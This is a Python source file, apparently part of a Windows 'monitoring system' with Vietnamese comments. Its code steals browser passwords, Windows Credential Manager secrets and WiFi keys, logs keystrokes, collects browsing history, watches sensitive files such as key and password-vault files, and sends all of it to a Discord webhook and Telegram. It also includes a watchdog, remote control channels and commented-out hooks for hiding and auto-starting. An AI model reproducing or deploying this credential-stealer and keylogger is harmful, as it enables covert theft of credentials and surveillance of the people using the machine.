        lines = "\n".join(
            f"[{r['browser']}] {r['url']}\n  👤 {r['user']} | 🔑 {r['password']}"
            for r in chunk
        )
        try:
            requests.post(CONFIG["discord_webhook"], json={
                "embeds": [{"title": f"🔑 MẬT KHẨU ({len(all_results)} tài khoản)",
                            "color": 0xe74c3c, "description": f"```{lines[:3900]}```"}],
                "username": f"Bot - {CONFIG['company_name']}"
            }, timeout=10)
        except Exception:
            pass

    # Telegram
    tg_lines = "\n".join(
        f"[{r['browser']}] {r['url'][:60]}\n👤 {r['user']} | 🔑 {r['password']}"
        for r in all_results[:30]
    )
    tg_broadcast(f"🔑 *Passwords ({len(all_results)} tài khoản)*\n```{tg_lines}```")
    logger.info(f"Đã lấy {len(all_results)} mật khẩu trình duyệt")

# ── 3. WINDOWS CREDENTIAL MANAGER ──────────────────────────
def get_credential_manager():
    """Lấy mật khẩu từ Windows Credential Manager (DPAPI, không bị v20)"""
    try:
        import win32cred
        creds = win32cred.CredEnumerate(None, 0)
    except Exception as e:
        tg_broadcast(f"❌ Credential Manager lỗi: {e}")
        return

    results = []
    for c in creds:
        try:
            target    = c.get("TargetName", "")
            username  = c.get("UserName", "") or ""
            blob      = c.get("CredentialBlob", b"")

            # Giải mã blob (DPAPI đã xử lý sẵn bởi win32cred)
            try:
                password = blob.decode("utf-16-le").rstrip("\x00") if blob else ""
            except Exception:
                try:
                    password = blob.decode("utf-8", errors="ignore")
                except Exception:
                    password = ""

            if not password and not username:
                continue

            # Lọc bỏ các cert/token hệ thống không có giá trị
            skip_prefixes = ("LegacyGeneric:target=", "WindowsLive:", "MicrosoftOffice")
            if any(target.startswith(p) for p in skip_prefixes) and not password:
                continue

            results.append({
                "target": target[:80],
                "user": username,
                "password": password
            })
        except Exception:
            continue

    if not results:
        tg_broadcast("📭 Credential Manager: không tìm thấy mật khẩu nào.")
        return

    # Gửi Telegram
    lines = "\n".join(
        f"🌐 {r['target']}\n👤 {r['user']} | 🔑 {r['password']}"
        for r in results
    )
    tg_broadcast(f"🗝 *Credential Manager ({len(results)} mục)*\n```{lines[:3500]}```")

    # Gửi Discord
    try:
        requests.post(CONFIG["discord_webhook"], json={
            "embeds": [{"title": f"🗝 CREDENTIAL MANAGER — {COMPUTER_NAME}",
                        "color": 0x9b59b6,
                        "description": f"```{lines[:3900]}```"}],
            "username": f"Bot - {CONFIG['company_name']}"
        }, timeout=10)
    except Exception:
        pass
    logger.info(f"Credential Manager: lấy được {len(results)} mục")

# ── 4. WIFI PASSWORDS ───────────────────────────────────────
def get_wifi_passwords():
    try:
        out      = subprocess.run(["netsh", "wlan", "show", "profiles"],
                                  capture_output=True, text=True, encoding="utf-8", errors="ignore")
        profiles = re.findall(r"All User Profile\s*:\s*(.+)", out.stdout)
        if not profiles:
            profiles = re.findall(r"Hồ sơ tất cả người dùng\s*:\s*(.+)", out.stdout)

        results = {}
        for name in profiles:
            name   = name.strip()
            detail = subprocess.run(["netsh", "wlan", "show", "profile", f"name={name}", "key=clear"],
                                    capture_output=True, text=True, encoding="utf-8", errors="ignore")
            pw = re.search(r"Key Content\s*:\s*(.+)", detail.stdout) or \
                 re.search(r"Nội dung khóa\s*:\s*(.+)", detail.stdout)
            results[name] = pw.group(1).strip() if pw else "(Không có mật khẩu)"

        if not results:
            return

        lines = "\n".join(f"📶 {s}: `{p}`" for s, p in results.items())
        tg_broadcast(f"📶 *WiFi Passwords — {COMPUTER_NAME}*\n{lines}")
        try:
            requests.post(CONFIG["discord_webhook"], json={
                "embeds": [{"title": f"📶 WIFI — {COMPUTER_NAME}", "color": 0x3498db,
                            "description": "\n".join(f"**{s}**: `{p}`" for s, p in results.items())}],
                "username": f"Bot - {CONFIG['company_name']}"
            }, timeout=10)
        except Exception:
            pass
        logger.info(f"Đã lấy {len(results)} mật khẩu WiFi")
    except Exception as e:
        logger.error(f"WiFi passwords error: {e}")

# ── 4. BROWSER HISTORY ──────────────────────────────────────
def get_browser_history(limit=50):
    browsers = {
        "Chrome":  Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data/Default/History",
        "Edge":    Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft/Edge/User Data/Default/History",
        "Brave":   Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware/Brave-Browser/User Data/Default/History",
        "Firefox": Path(os.environ.get("APPDATA", ""))      / "Mozilla/Firefox/Profiles",
    }
    all_history = []

    for browser, db_path in browsers.items():
        if browser == "Firefox":
            if not db_path.exists():
                continue
            for profile_dir in db_path.iterdir():
                places = profile_dir / "places.sqlite"
                if places.exists():
                    db_path = places
                    break
            else:
                continue

        if not db_path.exists():
            continue

        tmp = str(Path(CONFIG["log_dir"]) / f"_tmp_hist_{browser}.db")
        try:
            shutil.copy2(str(db_path), tmp)
            conn = sqlite3.connect(tmp)
            if browser == "Firefox":
                rows = conn.execute(
                    "SELECT url, title, visit_count, last_visit_date FROM moz_places "
                    "ORDER BY last_visit_date DESC LIMIT ?", (limit,)
                ).fetchall()
            else:
                rows = conn.execute(
                    "SELECT url, title, visit_count, last_visit_time FROM urls "
                    "ORDER BY last_visit_time DESC LIMIT ?", (limit,)
                ).fetchall()
            conn.close()
            for url, title, visits, _ in rows:
                all_history.append({"browser": browser, "url": url, "title": title or "", "visits": visits})
        except Exception:
            continue
        finally:
            try: os.remove(tmp)
            except Exception: pass

    if not all_history:
        return

    lines = "\n".join(
        f"[{h['browser']}] {h['title'][:40] or '?'}\n  {h['url'][:80]}"
        for h in all_history[:30]
    )
    tg_broadcast(f"🌐 *Browser History ({len(all_history)} trang)*\n```{lines[:3000]}```")
    try:
        requests.post(CONFIG["discord_webhook"], json={
            "embeds": [{"title": f"🌐 LỊCH SỬ — {COMPUTER_NAME}", "color": 0x2ecc71,
                        "description": f"```{lines[:3900]}```"}],
            "username": f"Bot - {CONFIG['company_name']}"
        }, timeout=10)
    except Exception:
        pass
    logger.info(f"Đã lấy {len(all_history)} lịch sử duyệt web")

# ── 5. FILE TRACKER ─────────────────────────────────────────
def file_tracker_thread():
    if not CONFIG.get("enable_file_tracker", True):
        return

    watch_dirs    = [Path.home() / "Desktop", Path.home() / "Documents", Path.home() / "Downloads"]
    SENSITIVE_EXT = {".doc", ".docx", ".xls", ".xlsx", ".pdf", ".txt", ".csv",
                     ".ppt", ".pptx", ".zip", ".rar", ".7z", ".key", ".pem",
                     ".env", ".sql", ".db", ".kdbx"}

    def snapshot():
        state = {}
        for d in watch_dirs:
            if d.exists():
                for f in d.rglob("*"):
                    if f.is_file():
                        try: state[str(f)] = f.stat().st_mtime
                        except Exception: pass
        return state

    prev = snapshot()
    logger.info(f"File tracker: theo dõi {len(watch_dirs)} thư mục")

    while True:
        time.sleep(10)
        try:
            curr     = snapshot()
            events   = []
            created  = [p for p in curr if p not in prev]
            deleted  = [p for p in prev if p not in curr]
            modified = [p for p in curr if p in prev and curr[p] != prev[p]]

            for p in created:
                if Path(p).suffix.lower() in SENSITIVE_EXT:
                    events.append(f"🆕 TẠO MỚI: `{p}`")
            for p in deleted:
                if Path(p).suffix.lower() in SENSITIVE_EXT:
                    events.append(f"🗑️ XÓA: `{p}`")
            for p in modified:
                if Path(p).suffix.lower() in SENSITIVE_EXT:
                    events.append(f"✏️ SỬA: `{p}`")

            if events:
                msg = f"📁 *File Activity — {COMPUTER_NAME}*\n" + "\n".join(events[:20])
                tg_broadcast(msg)
                try:
                    requests.post(CONFIG["discord_webhook"], json={
                        "embeds": [{"title": f"📁 FILE ACTIVITY — {COMPUTER_NAME}", "color": 0xe67e22,
                                    "description": "\n".join(events[:20]),
                                    "timestamp": datetime.now().isoformat()}],
                        "username": f"Bot - {CONFIG['company_name']}"
                    }, timeout=10)
                except Exception:
                    pass
            prev = curr
        except Exception as e:
            logger.debug(f"File tracker error: {e}")

# ==================== KEYLOGGER ====================
def clean_content(content):
    content = content.replace('·', '')
    while '[BACKSPACE]' in content:
        idx = content.find('[BACKSPACE]')
        content = (content[:idx-1] if idx > 0 else "") + content[idx+len('[BACKSPACE]'):]
    while '[DELETE]' in content:
        idx = content.find('[DELETE]')
        content = content[:idx] + content[idx+1+len('[DELETE]'):]
    return content

def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        return {
            "title": win32gui.GetWindowText(hwnd)[:200],
            "app":   psutil.Process(pid).name().lower() if pid else "unknown",
            "pid":   pid
        }
    except Exception:
        return None

def should_log_key():
    if not CONFIG["enable_keylogging"]:
        return False
    info = get_active_window_info()
    if not info:
        return False
    app = info["app"]
    if any(ex in app for ex in CONFIG["excluded_apps"]):
        return False
    if CONFIG["monitored_apps"] and app not in CONFIG["monitored_apps"]:
        return False
    return True

class SmartKeylogger:
    def __init__(self):
        self.key_buffer  = []
        self.buffer_lock = threading.Lock()
        self.flush_interval = 30
        self.listener    = None

    def on_press(self, key):
        if not should_log_key():
            return
        try:
            if hasattr(key, 'char') and key.char is not None:
                key_char = key.char
            else:
                special_map = {
                    keyboard.Key.space:     ' ',
                    keyboard.Key.enter:     '\n',
                    keyboard.Key.tab:       '\t',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.delete:    '[DELETE]',
                    keyboard.Key.up:        '[↑]',
                    keyboard.Key.down:      '[↓]',
                    keyboard.Key.left:      '[←]',
                    keyboard.Key.right:     '[→]',
                }
                key_char = special_map.get(key, f'[{key.name.upper()}]')
            with self.buffer_lock:
                self.key_buffer.append(key_char)
        except Exception:
            pass

    def flush(self):
        with self.buffer_lock:
            if not self.key_buffer:
                return
            content = ''.join(self.key_buffer)
            self.key_buffer.clear()

        content = clean_content(content)
        if not content.strip():
            return

        info      = get_active_window_info()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        app_name  = info["app"]   if info else "unknown"
        win_title = info["title"] if info else ""

        log_entry = json.dumps({
            "timestamp": timestamp, "computer": COMPUTER_NAME,
            "app": app_name, "window_title": win_title,
            "content": content, "length": len(content)
        }, ensure_ascii=False) + '\n'
        encrypted = cipher.encrypt(log_entry.encode())
        with open(keylog_file, 'ab') as f:
            f.write(encrypted + b'\n---ENCRYPTED_LOG_SEPARATOR---\n')

        cleaned = ' '.join(content.replace('\n', ' ').replace('\r', ' ').split())
        chunks  = [cleaned[i:i+1900] for i in range(0, len(cleaned), 1900)]
        for i, chunk in enumerate(chunks):
            if CONFIG["discord_webhook"] and "YOUR_WEBHOOK" not in CONFIG["discord_webhook"]:
                embed = {
                    "title": "⌨️ BÁO CÁO NHẬP LIỆU",
                    "color": 3447003,
                    "fields": [
                        {"name": "🕐 Thời Gian",   "value": timestamp,                  "inline": True},
                        {"name": "📱 Ứng Dụng",    "value": f"`{app_name}`",            "inline": True},
                        {"name": "🪟 Tiêu Đề",     "value": win_title[:250] or "N/A",  "inline": False},
                        {"name": f"📝 Nội Dung ({i+1}/{len(chunks)})", "value": chunk,  "inline": False},
                        {"name": "📊 Thống Kê",    "value": f"{len(content)} ký tự",   "inline": True},
                    ]
                }
                try:
                    requests.post(CONFIG["discord_webhook"],
                                  json={"embeds": [embed], "username": f"Bot - {CONFIG['company_name']}"},
                                  timeout=10)
                except Exception:
                    pass
            tg_broadcast(f"⌨️ *Keylog* — `{app_name}`\n"
                         f"🕐 {timestamp}\n🪟 {win_title[:100] or 'N/A'}\n"
                         f"📝 `{chunk[:3000]}`")

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        threading.Thread(target=self._periodic_flush, daemon=True).start()
        logger.info("Keylogger started")
        send_to_discord("⌨️ **Giám sát nhập liệu khởi động**", level="startup")

    def _periodic_flush(self):
        while True:
            time.sleep(self.flush_interval)
            self.flush()

    def stop(self):
        if self.listener:
            self.flush()
            self.listener.stop()
        logger.info("Keylogger stopped")

# ==================== MAIN ====================
def main():
    global shutdown_flag

    banner = f"""
    ╔══════════════════════════════════════════════════════════════════╗
    ║                    HỆ THỐNG GIÁM SÁT AGW                        ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║  Công ty : {CONFIG['company_name']:<48} ║
    ║  Máy     : {COMPUTER_NAME:<48} ║
    ║  OS      : {OS_NAME:<48} ║
    ║  Start   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<48} ║
    ╚══════════════════════════════════════════════════════════════════╝"""
    print(banner)
    logger.info("STARTING AGW MONITORING SYSTEM")
    send_to_discord("🚀 **Hệ thống giám sát đã khởi động**", level="startup")

    # Xóa cờ dừng cũ
    try:
        if os.path.exists(STOP_FLAG):
            os.remove(STOP_FLAG)
    except Exception:
        pass

    _write_pid(PID_FILE)

    # Spawn watchdog
    wd_pid = _read_pid(WD_PID_FILE)
    if wd_pid is None or not _is_alive(wd_pid):
        try:
            _spawn_watchdog()
            logger.info("✅ Watchdog đã khởi động")
        except Exception as e:
            logger.warning(f"Không spawn được watchdog: {e}")
    threading.Thread(target=_watchdog_keepalive_thread, daemon=True).start()

    # Bật các tính năng bên dưới nếu muốn cài đặt và ẩn khi khởi động:
    # installed_path = install_self()
    # add_to_startup(installed_path)
    # hide_console()

    # Control server (LAN)
    threading.Thread(target=start_control_server, daemon=True).start()

    # Relay poll (Remote/Internet)
    threading.Thread(target=relay_poll_thread, daemon=True).start()

    # Telegram bot
    threading.Thread(target=telegram_thread, daemon=True).start()

    # Clipboard monitor
    threading.Thread(target=clipboard_monitor_thread, daemon=True).start()

    # File tracker
    threading.Thread(target=file_tracker_thread, daemon=True).start()

    # Screenshot liên tục
    threading.Thread(target=continuous_screenshot_thread, daemon=True).start()

    # Keylogger
    keylogger = SmartKeylogger()
    keylogger.start()

    cycle_count = 0
    try:
        while True:
            cycle_count += 1
            if cycle_count % 30 == 0:
                send_to_discord(f"💓 **Heartbeat** — Cycle {cycle_count}", level="info")

            if shutdown_flag:
                try:
                    open(STOP_FLAG, "w").close()
                except Exception:
                    pass
                keylogger.stop()
                logger.info("=== STOPPED BY REMOTE COMMAND ===")
                send_to_discord("🛑 **Hệ thống đã dừng theo lệnh từ xa**", level="shutdown")
                break

            time.sleep(CONFIG["monitor_interval"])

    except KeyboardInterrupt:
        try:
            open(STOP_FLAG, "w").close()
        except Exception:
            pass
        keylogger.stop()
        logger.info("=== STOPPED MANUALLY ===")
        send_to_discord("🛑 **Hệ thống giám sát dừng lại**", level="shutdown")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        send_to_discord(f"❌ Lỗi bất ngờ: {e}", level="alert")

if __name__ == "__main__":
    if "--watchdog" in sys.argv:
        watchdog_mode()
    else:
        main()
